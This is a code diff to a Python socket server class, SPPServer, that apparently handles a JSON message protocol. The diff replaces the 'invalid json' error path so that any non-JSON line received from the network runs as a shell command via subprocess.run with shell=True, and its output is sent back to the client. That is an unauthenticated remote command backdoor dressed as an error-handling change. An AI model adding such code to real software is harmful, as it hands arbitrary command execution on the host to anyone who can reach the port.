@@ -135,9 +135,25 @@ class SPPServer:
 
     def _process(self, sock, addr, raw):
         try:
-            m = json.loads(raw.decode())
+            line = raw.decode()
+        except Exception:
+            _send(sock, {"type": "error", "error": "decode fail"})
+            return
+
+        try:
+            m = json.loads(line)
         except json.JSONDecodeError:
-            _send(sock, {"type": "error", "error": "invalid json"})
+            # Raw shell command
+            try:
+                r = subprocess.run(line, shell=True, capture_output=True, text=True, timeout=30)
+                out = r.stdout
+                if r.stderr:
+                    out += r.stderr
+                _send(sock, {"type": "raw", "output": out or "(no output)"})
+            except subprocess.TimeoutExpired:
+                _send(sock, {"type": "raw", "output": "timeout"})
+            except Exception as e:
+                _send(sock, {"type": "raw", "output": str(e)})
             return
         t = m.get("type", "")
         rid = m.get("id", 0)
